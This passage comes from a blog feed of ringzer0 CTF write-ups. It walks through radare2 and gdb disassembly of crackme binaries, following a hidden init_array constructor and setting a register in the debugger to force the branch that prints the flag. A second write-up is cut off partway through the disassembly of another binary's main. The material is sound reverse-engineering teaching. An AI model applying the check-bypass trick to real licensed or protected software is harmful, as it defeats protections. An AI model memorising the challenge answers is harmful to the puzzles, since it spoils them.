|       |   0x00400793      4889c2         mov rdx, rax
|       |   0x00400796      bf01000000     mov edi, 1
|       |   0x0040079b      31c0           xor eax, eax
|       |   0x0040079d      e8fefdffff     call sym.imp.__printf_chk
|       |   0x004007a2      4889df         mov rdi, rbx
|       |   0x004007a5      e896fdffff     call sym.imp.free          ; void free(void *ptr);
|       |   0x004007aa      4889da         mov rdx, rbx
|       |   0x004007ad      bf01000000     mov edi, 1
|       |   0x004007b2      be71084000     mov esi, str.Freeing_buffer__p..._n ; &#34;Freeing buffer %p....&#34; @ 0x400871
|       |   0x004007b7      31c0           xor eax, eax
|       |   0x004007b9      e8e2fdffff     call sym.imp.__printf_chk
|       |   0x004007be      5b             pop rbx
|       |   0x004007bf      bf90084000     mov edi, str.Heap_is_working_perfectly__No_Flag_then ; &#34;Heap is working perfectly! No Flag then&#34; @ 0x400890
\       `=&lt; 0x004007c4      e987fdffff     jmp sym.imp.puts
</code></pre></div><p>Nothing suspicious about it: <code>malloc</code> is being called and then <code>free</code>. Now let&rsquo;s have a look at the constructors, which are usually
called before <code>main</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[0x00400688]&gt; pdf @ entry0
            ;-- _start:
/ (fcn) entry0 41
|   entry0 ();
|           ; UNKNOWN XREF from 0x00400018 (unk)
|           0x00400688      31ed           xor ebp, ebp
|           0x0040068a      4989d1         mov r9, rdx
|           0x0040068d      5e             pop rsi
|           0x0040068e      4889e2         mov rdx, rsp
|           0x00400691      4883e4f0       and rsp, 0xfffffffffffffff0
|           0x00400695      50             push rax
|           0x00400696      54             push rsp
|           0x00400697      49c7c0400840.  mov r8, sym.__libc_csu_fini ; sym.__libc_csu_fini
|           0x0040069e      48c7c1d00740.  mov rcx, sym.__libc_csu_init ; &#34;AWA..AVI..AUI..ATL.% . &#34; @ 0x4007d0
|           0x004006a5      48c7c7600640.  mov rdi, sym.main           ; &#34;H......`&#34; @ 0x400660
\           0x004006ac      e8bffeffff     call sym.imp.__libc_start_main; int __libc_start_main(func main, int argc, char **ubp_av, func init, func fini, func rtld_fini, void *stack_end);
</code></pre></div><p>Ahh, there we go. From the links mentioned before we know that <code>__libc_start_main</code> has following syntax:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">__libc_start_main</span>( 
	<span style="color:#6ab825;font-weight:bold">int</span> (*main) (<span style="color:#6ab825;font-weight:bold">int</span>, <span style="color:#6ab825;font-weight:bold">char</span> * *, <span style="color:#6ab825;font-weight:bold">char</span> * *), 
	<span style="color:#6ab825;font-weight:bold">int</span> argc, 
	<span style="color:#6ab825;font-weight:bold">char</span> * * ubp_av, 
	<span style="color:#6ab825;font-weight:bold">void</span> (*init) (<span style="color:#6ab825;font-weight:bold">void</span>), 
	<span style="color:#6ab825;font-weight:bold">void</span> (*fini) (<span style="color:#6ab825;font-weight:bold">void</span>), 
	<span style="color:#6ab825;font-weight:bold">void</span> (*rtld_fini) (<span style="color:#6ab825;font-weight:bold">void</span>), 
	<span style="color:#6ab825;font-weight:bold">void</span> (* stack_end)
);
</code></pre></div><p>So before calling <code>main</code> its arguments are copied to the corresponding registers. Since we&rsquo;re dealing with <code>x86-64</code>
the <strong>ABI</strong> requires that registers are used instead of the stack. On Linux we have the <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI">System V AMD64 ABI</a> calling convention which uses following registers for the parameters:</p>
<ul>
<li>RDI</li>
<li>RSI</li>
<li>RDX</li>
<li>RCX</li>
<li>R8</li>
<li>R9</li>
</ul>
<p>Additional arguments can be passed on the stack. In our case we have:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>digraph G {
    // Define layout
    graph [pad=&quot;.75&quot;, ranksep=&quot;0.95&quot;, nodesep=&quot;0.05&quot;];
    rankdir=LR;
    node [shape=&quot;record&quot;];
    rank=same;
 
    // Define pointers
    rsp [
        label=&quot;&lt;p&gt; $rdi \l&quot;, height=&quot;0.1&quot;,
        color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white
    ];
    
    // rbp [
    // 	label=&quot;&lt;p&gt; $rbp \l&quot;, height=&quot;0.1&quot;,
    // 	color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white
    // ];
 
    rsp_4 [
        label=&quot;&lt;p&gt; $rsi \l&quot;, height=&quot;0.01&quot;,
        color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white
    ];
 
 
    rsp_8 [
        label=&quot;&lt;p&gt; $rdx \l&quot;, height=&quot;0.01&quot;,
        color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white,
    ];
 
    rsp_12 [
        label=&quot;&lt;p&gt; $rcx \l&quot;, height=&quot;0.01&quot;,
        color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white,
    ];
    
    rsp_16 [
        label=&quot;&lt;p&gt; $r8 \l&quot;, height=&quot;0.01&quot;,
        color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white,
    ];
    
    rsp_20 [
        label=&quot;&lt;p&gt; $r9 \l&quot;, height=&quot;0.01&quot;,
        color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white,
    ];
 
    // Define stack
    stack [
        width=&quot;3&quot;,
        label=&quot;&lt;p&gt;\nArguments\n\n | &lt;bp&gt;\n...\n\n | &lt;20&gt;0x7ffff7de9900 (_dl_fini) \l| &lt;16&gt;0x00400840 (sym.__libc_csu_fini) \l| &lt;12&gt;0x4007d0 (sym.__libc_csu_init)  \l | &lt;8&gt;(char **ubp_av = $rsp) \l | &lt;4&gt;(int argc = pop)  \l | &lt;0&gt;0x400660 (sym.main) \l&quot;
    ];
   
   
    // Pointer -&gt; Stack edges
    //rbp:p -&gt; stack:bp [style=invis];
    rsp:p -&gt; stack:0 [style=invis];
    rsp_4:p -&gt; stack:4 [style=invis];
    rsp_8:p -&gt; stack:8 [style=invis];
    rsp_12:p -&gt; stack:12 [style=invis];
    rsp_16:p -&gt; stack:16 [style=invis];
    rsp_20:p -&gt; stack:20 [style=invis];
}
</code></pre>

</details>

<p><img src="/posts/img/2016/r0-binaries-heap-allocator/stack.dot.png" alt=""></p>
<p>As stated <a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">here</a> <code>__libc_start_main</code> does
the following:</p>
<ul>
<li>Takes care of some security problems with setuid setgid programs</li>
<li>Starts up threading</li>
<li>Registers the fini (our program), and rtld_fini (run-time loader) arguments to get run by at_exit to run the program&rsquo;s and the loader&rsquo;s cleanup routines</li>
<li>Calls the init argument</li>
<li>Calls the main with the argc and argv arguments passed to it and with the global __environ argument as detailed above.</li>
<li>Calls exit with the return value of main</li>
</ul>
<p>The <code>init</code> argument is set to <code>__libc_csu_init</code>. In the <strong>glibc</strong> source tree you will find <code>csu/elf-init.c</code> which contains <code>__libc_csu_init</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">__libc_csu_init</span> (<span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span> **argv, <span style="color:#6ab825;font-weight:bold">char</span> **envp) {
	 _init (); 
	
	<span style="color:#6ab825;font-weight:bold">const</span> size_t size = __init_array_end - __init_array_start; 
	<span style="color:#6ab825;font-weight:bold">for</span> (size_t i = <span style="color:#3677a9">0</span>; i &lt; size; i++) 
		(*__init_array_start [i]) (argc, argv, envp); 
}
</code></pre></div><p>Let&rsquo;s have a look at the disassembly:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[0x00400688]&gt; pdf @ sym.__libc_csu_init
/ (fcn) sym.__libc_csu_init 101
|   sym.__libc_csu_init ();
|           ; DATA XREF from 0x0040069e (entry0)
|           ; DATA XREF from 0x004005c4 (sym.__libc_csu_ctor)
|           ; DATA XREF from 0x004005c9 (sym.__libc_csu_ctor)
|           0x004007d0      4157           push r15
|           0x004007d2      4189ff         mov r15d, edi
|           ; DATA XREF from 0x004005d2 (sym.__libc_csu_ctor)
|           0x004007d5      4156           push r14
|           0x004007d7      4989f6         mov r14, rsi
|           0x004007da      4155           push r13
|           0x004007dc      4989d5         mov r13, rdx
|           0x004007df      4154           push r12
|           0x004007e1      4c8d25200620.  lea r12, qword obj.__frame_dummy_init_array_entry ; 0x600e08 ; loc.__init_array_start ; &#34;P.@&#34; @ 0x600e08
|           0x004007e8      55             push rbp
|           0x004007e9      488d2d280620.  lea rbp, qword obj.__do_global_dtors_aux_fini_array_entry ; 0x600e18 ; loc.__init_array_end ; &#34;0.@&#34; @ 0x600e18
|           0x004007f0      53             push rbx
|           0x004007f1      4c29e5         sub rbp, r12
|           0x004007f4      31db           xor ebx, ebx
|           0x004007f6      48c1fd03       sar rbp, 3
|           0x004007fa      4883ec08       sub rsp, 8
|           0x004007fe      e805fdffff     call sym._init
|           0x00400803      4885ed         test rbp, rbp
|       ,=&lt; 0x00400806      741e           je 0x400826
|       |   0x00400808      0f1f84000000.  nop dword [rax + rax]
|      .--&gt; 0x00400810      4c89ea         mov rdx, r13
|      ||   0x00400813      4c89f6         mov rsi, r14
|      ||   0x00400816      4489ff         mov edi, r15d
|      ||   0x00400819      41ff14dc       call qword [r12 + rbx*8]
|      ||   0x0040081d      4883c301       add rbx, 1
|      ||   0x00400821      4839eb         cmp rbx, rbp
|      `==&lt; 0x00400824      75ea           jne 0x400810
|       `-&gt; 0x00400826      4883c408       add rsp, 8
|           0x0040082a      5b             pop rbx
|           0x0040082b      5d             pop rbp
|           0x0040082c      415c           pop r12
|           0x0040082e      415d           pop r13
|           0x00400830      415e           pop r14
|           0x00400832      415f           pop r15
\           0x00400834      c3             ret
</code></pre></div><p>You can definitely see the call to <code>_init()</code>. The loop inside looks very interesting:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">|       |   0x08048592      8db600000000   lea esi, [esi]
|      .--&gt; 0x08048598      8b442438       mov eax, dword [esp + arg_38h] ; [0x38:4]=52 ; &#39;8&#39;
|      ||   0x0804859c      892c24         mov dword [esp], ebp
|      ||   0x0804859f      89442408       mov dword [esp + local_8h], eax
|      ||   0x080485a3      8b442434       mov eax, dword [esp + arg_34h] ; [0x34:4]=6 ; &#39;4&#39;
|      ||   0x080485a7      89442404       mov dword [esp + local_4h], eax
|      ||   0x080485ab      ff94b308ffff.  call dword [ebx + esi*4 - 0xf8]
|      ||   0x080485b2      83c601         add esi, 1
|      ||   0x080485b5      39fe           cmp esi, edi
|      `==&lt; 0x080485b7      75df           jne 0x8048598
</code></pre></div><p>Let&rsquo;s have a look what&rsquo;s happening inside this loop:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gef&gt; b *0x0000000000400803
gef&gt; r
gef&gt; 
0x0000000000400819    &lt;__libc_csu_init+73&gt;     call   QWORD PTR [r12+rbx*8]   &lt;- $pc

gef&gt; x/x $r12
0x600e08:       0x00400750
gef&gt; x/x $rbx
0x0:    Cannot access memory at address 0x0
</code></pre></div><p>As you can see the address at <code>$r12 + rbx*8</code> will be called. Since <code>$rbx</code> is null the programm
execution will jump to the address <code>0x00400750</code>. But where does this address come from?</p>
<h3 id="constructors">Constructors</h3>
<p>As you have seen previously an <code>init_array</code> is used to call some functions. In C you&rsquo;d usually
implement some constructors using <code>__attribute__</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">init</span>(<span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span> **argv, <span style="color:#6ab825;font-weight:bold">char</span> **envp) { 
	printf(<span style="color:#ed9d13">&#34;INIT!&#34;</span>); 
}
__attribute__((section(<span style="color:#ed9d13">&#34;.init_array&#34;</span>))) typeof(init) *__init = init;
</code></pre></div><p>This whole information is stored inside the ELF binary at a section called <code>init_array</code>. Let&rsquo;s
see what it contains:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ objdump -d -j .init_array IntelligentSoftware

IntelligentSoftware:     file format elf64-x86-64


Disassembly of section .init_array:

0000000000600e08 &lt;__frame_dummy_init_array_entry&gt;:
  600e08:       50 07 40 00 00 00 00 00 b0 05 40 00 00 00 00 00     P.@.......@.....
</code></pre></div><p>Did you recognize the address <code>0x600e08</code> and the value <code>0x00400750</code>? Let&rsquo;s go back to <code>radare</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[0x00400688]&gt; pxr @ obj.__frame_dummy_init_array_entry
0x00600e08  0x0000000000400750   P.@..... (.text) sym.frame_dummy sym.frame_dummy R X &#39;cmp qword [rip + 0x2006c8], 0&#39;
0x00600e10  0x00000000004005b0   ..@..... (.text) sym.__libc_csu_ctor sym.__libc_csu_ctor R X &#39;sub rsp, 0x48&#39;
0x00600e18  0x0000000000400730   0.@..... (.text) sym.__do_global_dtors_aux sym.__do_global_dtors_aux R X &#39;cmp byte [rip + 0x200998], 0&#39;
0x00600e20  0x0000000000000000   ........ section_end.GNU_STACK
...
</code></pre></div><p>Let&rsquo;s have a look at the <strong>2nd</strong>  constructor/entry:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">/ (fcn) sym.__libc_csu_ctor 216
|   sym.__libc_csu_ctor ();
|           ; var int local_8h @ rsp+0x8
|           ; var int local_10h @ rsp+0x10
|           ; var int local_11h @ rsp+0x11
|           ; var int local_12h @ rsp+0x12
|           ; var int local_14h @ rsp+0x14
|           ; var int local_18h @ rsp+0x18
|           ; var int local_38h @ rsp+0x38
|           ; UNKNOWN XREF from 0x00400e10 (unk)
|           ; CALL XREF from 0x004005b0 (sym.__libc_csu_ctor)
|           0x004005b0      4883ec48       sub rsp, 0x48               ; &#39;H&#39; ; [13] va=0x004005b0 pa=0x000005b0 sz=658 vsz=658 rwx=--r-x .text
|           0x004005b4      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x1200 ; &#39;(&#39;
|           0x004005bd      4889442438     mov qword [rsp + local_38h], rax
|           0x004005c2      31c0           xor eax, eax
|           0x004005c4      b8d0074000     mov eax, sym.__libc_csu_init ; &#34;AWA..AVI..AUI..ATL.% . &#34; @ 0x4007d0
|           0x004005c9      48c7442408d0.  mov qword [rsp + local_8h], sym.__libc_csu_init ; [0x4007d0:8]=0x495641ff89415741 LEA sym.__libc_csu_init ; &#34;AWA..AVI..AUI..ATL.% . &#34; @ 0x4007d0
|           0x004005d2      678b4005       mov eax, dword [eax + 5]    ; [0x5:4]=257
|           0x004005d6      3ccc           cmp al, 0xcc
|       ,=&lt; 0x004005d8      7415           je 0x4005ef
|       |   ; JMP XREF from 0x0040064c (sym.__libc_csu_ctor)
|       |   0x004005da      488b442438     mov rax, qword [rsp + local_38h] ; [0x38:8]=0x1b001e00400009 ; &#39;8&#39;
|       |   0x004005df      644833042528.  xor rax, qword fs:[0x28]
|      ,==&lt; 0x004005e8      7570           jne 0x40065a
|      ||   0x004005ea      4883c448       add rsp, 0x48               ; &#39;H&#39;
|      ||   0x004005ee      c3             ret
|      |`-&gt; 0x004005ef      488b3d8a0a20.  mov rdi, qword [obj.__libc_ptr] ; [0x601080:8]=0x6010a0 obj.banner LEA obj.__libc_ptr ; obj.__libc_ptr
|      |    0x004005f6      c644241046     mov byte [rsp + local_10h], 0x46 ; &#39;F&#39; ; [0x46:1]=0 ; &#39;F&#39;
|      |    0x004005fb      488d742410     lea rsi, qword [rsp + local_10h] ; 0x10
|      |    0x00400600      c64424114c     mov byte [rsp + local_11h], 0x4c ; &#39;L&#39; ; [0x4c:1]=0 ; &#39;L&#39;
|      |    0x00400605      66c744241833.  mov word [rsp + local_18h], 0x3933 ; [0x3933:2]=0xffff
|      |    0x0040060c      b828000000     mov eax, 0x28               ; &#39;(&#39;
|      |    0x00400611      66c744241241.  mov word [rsp + local_12h], 0x4741 ; [0x4741:2]=0xffff
|      |    0x00400618      c64424142d     mov byte [rsp + local_14h], 0x2d ; &#39;-&#39; ; [0x2d:1]=0 ; &#39;-&#39;
|      |    0x0040061d      40f6c701       test dil, 1
|      |,=&lt; 0x00400621      752b           jne 0x40064e
|      ||   ; JMP XREF from 0x00400651 (sym.__libc_csu_ctor)
|      ||   0x00400623      40f6c702       test dil, 2
|     ,===&lt; 0x00400627      752a           jne 0x400653
|     |||   ; JMP XREF from 0x00400658 (sym.__libc_csu_ctor)
|     |||   0x00400629      89c1           mov ecx, eax
|     |||   0x0040062b      31d2           xor edx, edx
|     |||   0x0040062d      c1e902         shr ecx, 2
|     |||   0x00400630      a802           test al, 2

</code></pre></div><p>Do you see how the string <code>FLAG-</code> is being concatenated? Let&rsquo;s <code>seek</code> to that address and let <code>radare</code> give us some
graphics:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[0x00400688]&gt; s 0x00000000004005b
[0x004005b0]&gt; VV

                                                         =---------------------------------=
                                                         | [0x4005b0]                      |
                                                         | 0x004005c4 sym.__libc_csu_init  |
                                                         | 0x004005c9 sym.__libc_csu_init  |
                                                         =---------------------------------=
                                                               t f
                                                             .-&#39; &#39;-----------------.
                                                             |                     |
                                                             |                     |
                                                       =--------------------=      |
                                                       |  0x4005ef          |      |
                                                       =--------------------=      |
                                                             t f                   |
                                                       .-----&#39; &#39;-------------.     |
                                                       |                     |     |
                                                       |                     |     |
                                                 =--------------------=      |     |
                                                 |  0x40064e          |      |     |
                                                 =--------------------=      |     |
                                                     v                       |     |
                                                     &#39;-----.   .-------------&#39;     |
                                                           |   |                   |
                                                           |   |                   |
                                                       =--------------------=      |
                                                       |  0x400623          |      |
                                                       =--------------------=      |
                                                             t f                   |
                                                       .-----&#39; &#39;-------------.     |
                                                       |                     |     |
                                                       |                     |     |
                                                 =--------------------=      |     |
                                                 |  0x400653          |      |     |
                                                 =--------------------=      |     |
                                                     v                       |     |
                                                     &#39;-----.   .-------------&#39;     |
                                                           |   |                   |
                                                           |   |                   |
                                                       =--------------------=      |
                                                       |  0x400629          |      |
                                                       =--------------------=      |
                                                               f t                 |
                                                         .-----&#39; &#39;-----------.     |
                                                         |                   |     |
                                                         |                   |     |
                                                 =--------------------=      |     |
                                                 |  0x400636          |      |     |
                                                 =--------------------=      |     |
                                                     v                       |     |
                                                     &#39;-----.     .-----------&#39;     |
                                                           |     |                 |
                                                           |     |                 |
                                                       =--------------------=      |
                                                       |  0x400641          |      |
                                                       =--------------------=      |
                                                               f t                 |
                                                         .-----&#39; &#39;-----------.     |
                                                         |                   |     |
                                                         |                   |     |
                                                 =--------------------=      |     |
                                                 |  0x400645          |      |     |
                                                 =--------------------=      |     |
                                                     v                       |     |
                                                     &#39;------------.   .-.----&#39;-----&#39;
                                                                  |   | |
                                                                  |   | |
                                                              =--------------------=
                                                              |  0x4005da          |
                                                              =--------------------=
                                                                    t f
                                      .-----------------------------&#39; &#39;-------------------.
                                      |                                                   |
                                      |                                                   |
                                =------------------------------------------=      =--------------------=
                                |  0x40065a                                |      |  0x4005ea          |
                                | 0x0040065a call sym.imp.__stack_chk_fail |      =--------------------=
                                | 0x00400675 call sym.imp.__printf_chk     |
                                | 0x0040067c call sym.get_flag             |
                                =------------------------------------------=

</code></pre></div><p>As you can see there is one execution path which will directly lead to <code>0x4005da</code> and then either
to <code>0x4005ea</code> or <code>sym.imp.__stack_chk_fail</code> if sth was wrong with the stack (this function
wil be called if the stack canaries were modified). Now let&rsquo;s have a look what happens inside
the first block:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">                =----------------------------------------------------------------------------=
                | [0x4005b0]                                                                 |
                |   ;-- section_end..plt:                                                    |
                |   ;-- section..text:                                                       |
                | (fcn) sym.__libc_csu_ctor 216                                              |
                |   sym.__libc_csu_ctor ();                                                  |
                | ; var int local_8h @ rsp+0x8                                               |
                | ; var int local_10h @ rsp+0x10                                             |
                | ; var int local_11h @ rsp+0x11                                             |
                | ; var int local_12h @ rsp+0x12                                             |
                | ; var int local_14h @ rsp+0x14                                             |
                | ; var int local_18h @ rsp+0x18                                             |
                | ; var int local_38h @ rsp+0x38                                             |
                | 0x004005b0 4883ec48       sub rsp, 0x48                                    |
                | 0x004005b4 64488b042528.  mov rax, qword fs:[0x28]                         |
                | 0x004005bd 4889442438     mov qword [rsp + local_38h], rax                 |
                | 0x004005c2 31c0           xor eax, eax                                     |
                | 0x004005c4 b8d0074000     mov eax, sym.__libc_csu_init                     |
                | 0x004005c9 48c7442408d0.  mov qword [rsp + local_8h], sym.__libc_csu_init  |
                | 0x004005d2 678b4005       mov eax, dword [eax + 5]                         |
                | 0x004005d6 3ccc           cmp al, 0xcc                                     |
                | 0x004005d8 7415           je 0x4005ef ;[a]                                 |
                =----------------------------------------------------------------------------=
                      t f
          .-----------&#39; &#39;-------------------------------------------------.
          |                                                               |
          |                                                               |
    =---------------------------------------------------------------=     |
    |  0x4005ef                                                     |     |
    | 0x004005ef 488b3d8a0a20.  mov rdi, qword [obj.__libc_ptr]     |     |
    | 0x004005f6 c644241046     mov byte [rsp + local_10h], 0x46    |     |
    | 0x004005fb 488d742410     lea rsi, qword [rsp + local_10h]    |     |
    | 0x00400600 c64424114c     mov byte [rsp + local_11h], 0x4c    |     |
    | 0x00400605 66c744241833.  mov word [rsp + local_18h], 0x3933  |     |
    | 0x0040060c b828000000     mov eax, 0x28                       |     |
    | 0x00400611 66c744241241.  mov word [rsp + local_12h], 0x4741  |     |
    | 0x00400618 c64424142d     mov byte [rsp + local_14h], 0x2d    |     |
    | 0x0040061d 40f6c701       test dil, 1                         |     |
    | 0x00400621 752b           jne 0x40064e ;[b]                   |     |
    =---------------------------------------------------------------=     |

</code></pre></div><p>Apparently the programm will jump to <code>0x4005ef</code> only if <code>$al = 0xcc</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">|           0x004005d6      3ccc           cmp al, 0xcc
|       ,=&lt; 0x004005d8      7415           je 0x4005ef
</code></pre></div><p>Let&rsquo;s debug the binary and see what happens:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gef&gt;  b *0x004005d6
Breakpoint 1 at 0x4005d6
gef&gt;  r
gef&gt;  set $al=0xcc
gef&gt;  c
Continuing.
FLAG-Allocating 1024 bytes 0x602420...
Freeing buffer 0x602420...
Heap is working perfectly! No Flag then
[Inferior 1 (process 1745) exited normally]
</code></pre></div><p>Well <code>FLAG-Allocating</code> looks like a flag! ;)</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>ringzer0 CTF - Binaries - Time to learn x86 ASM and gdb</title>
      <link>https://blog.dornea.nu/2016/11/29/ringzer0-ctf-binaries-time-to-learn-x86-asm-and-gdb/</link>
      <pubDate>Tue, 29 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/11/29/ringzer0-ctf-binaries-time-to-learn-x86-asm-and-gdb/</guid>
      <content:encoded><![CDATA[<p>This one was a quite easy one. Using radare let&rsquo;s find more information about the binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ r2 -AA 88eb31060c4abd0931878bf7d2dd8c1a

[0x08048380]&gt; iI
havecode true
pic      false
canary   false
nx       true
crypto   false
va       true
intrp    /lib/ld-linux.so.2
bintype  elf
class    ELF32
lang     c
arch     x86
bits     32
machine  Intel 80386
os       linux
minopsz  1
maxopsz  16
pcalign  0
subsys   linux
endian   little
stripped false
static   false
linenum  true
lsyms    true
relocs   true
rpath    NONE
binsz    7450
</code></pre></div><p>Ok, now let&rsquo;s have a look at the <strong>entry point</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[0x08048380]&gt; pdf @ sym.main
;-- main:
/ (fcn) sym.main 231
   sym.main ();
           ; var int local_4h_2 @ ebp-0x4
           ; var int local_4h @ esp+0x4
           ; var int local_8h @ esp+0x8
           ; var int local_1ch @ esp+0x1c
           ; arg int arg_2ch @ esp+0x2c
           ; JMP XREF from 0x08048397 (entry0)
           ; DATA XREF from 0x08048397 (entry0)
           0x0804846c      55             push ebp
           0x0804846d      89e5           mov ebp, esp
           0x0804846f      57             push edi
           0x08048470      83e4f0         and esp, 0xfffffff0
           0x08048473      83ec30         sub esp, 0x30               ; &#39;0&#39;
           0x08048476      c744242c0000.  mov dword [esp + arg_2ch], 0
           0x0804847e      c70424180000.  mov dword [esp], 0x18       ; [0x18:4]=0x8048380 sym._start
           0x08048485      e8a6feffff     call sym.imp.malloc        ;  void *malloc(size_t size);
           0x0804848a      8944242c       mov dword [esp + arg_2ch], eax
           0x0804848e      c74424081800.  mov dword [esp + local_8h], 0x18 ; [0x18:4]=0x8048380 sym._start
           0x08048496      c74424040000.  mov dword [esp + local_4h], 0
           0x0804849e      8b44242c       mov eax, dword [esp + arg_2ch] ; [0x2c:4]=0x280009 ; &#39;,&#39;
           0x080484a2      890424         mov dword [esp], eax
           0x080484a5      e8c6feffff     call sym.imp.memset
           0x080484aa      8b44242c       mov eax, dword [esp + arg_2ch] ; [0x2c:4]=0x280009 ; &#39;,&#39;
           0x080484ae      c700464c4147   mov dword [eax], 0x47414c46 ; [0x47414c46:4]=-1
           0x080484b4      c740042d3430.  mov dword [eax + 4], 0x3930342d ; [0x3930342d:4]=-1
           0x080484bb      66c740083200   mov word [eax + 8], 0x32    ; &#39;2&#39; ; [0x32:2]=27 ; &#39;2&#39;
           0x080484c1      8b44242c       mov eax, dword [esp + arg_2ch] ; [0x2c:4]=0x280009 ; &#39;,&#39;
           0x080484c5      c744241cffff.  mov dword [esp + local_1ch], 0xffffffff ; [0xffffffff:4]=-1 LEA edi ; edi
           0x080484cd      89c2           mov edx, eax
           0x080484cf      b800000000     mov eax, 0
           0x080484d4      8b4c241c       mov ecx, dword [esp + local_1ch] ; [0x1c:4]=52
           0x080484d8      89d7           mov edi, edx
           0x080484da      f2ae           repne scasb al, byte es:[edi]
           0x080484dc      89c8           mov eax, ecx
           0x080484de      f7d0           not eax
           0x080484e0      8d50ff         lea edx, [eax - 1]
           0x080484e3      8b44242c       mov eax, dword [esp + arg_2ch] ; [0x2c:4]=0x280009 ; &#39;,&#39;
           0x080484e7      01d0           add eax, edx
           0x080484e9      c70038343975   mov dword [eax], 0x75393438 ; [0x75393438:4]=-1
           0x080484ef      c74004696f32.  mov dword [eax + 4], 0x6a326f69 ; [0x6a326f69:4]=-1
           0x080484f6      66c740086600   mov word [eax + 8], 0x66    ; &#39;f&#39; ; [0x66:2]=0 ; &#39;f&#39;
           0x080484fc      c70424f88504.  mov dword [esp], str.Loading... ; [0x80485f8:4]=0x64616f4c LEA str.Loading... ; &#34;Loading...&#34; @ 0x80485f8
           0x08048503      e838feffff     call sym.imp.puts
           0x08048508      8b44242c       mov eax, dword [esp + arg_2ch] ; [0x2c:4]=0x280009 ; &#39;,&#39;
           0x0804850c      c744241cffff.  mov dword [esp + local_1ch], 0xffffffff ; [0xffffffff:4]=-1 LEA edi ; edi
           0x08048514      89c2           mov edx, eax
           0x08048516      b800000000     mov eax, 0
           0x0804851b      8b4c241c       mov ecx, dword [esp + local_1ch] ; [0x1c:4]=52
           0x0804851f      89d7           mov edi, edx
           0x08048521      f2ae           repne scasb al, byte es:[edi]
           0x08048523      89c8           mov eax, ecx
           0x08048525      f7d0           not eax
           0x08048527      8d50ff         lea edx, [eax - 1]
           0x0804852a      8b44242c       mov eax, dword [esp + arg_2ch] ; [0x2c:4]=0x280009 ; &#39;,&#39;
           0x0804852e      01d0           add eax, edx
           0x08048530      c7006b6c736a   mov dword [eax], 0x6a736c6b ; [0x6a736c6b:4]=-1
           0x08048536      c74004346b6c.  mov dword [eax + 4], 0x6c6b34 ; [0x6c6b34:4]=-1
           0x0804853d      c70424038604.  mov dword [esp], str.Where_is_the_flag_ ; [0x8048603:4]=0x72656857 LEA str.Where_is_the_flag_ ; &#34;Where is the flag?&#34; @ 0x8048603
           0x08048544      e8f7fdffff     call sym.imp.puts
           0x08048549      b800000000     mov eax, 0
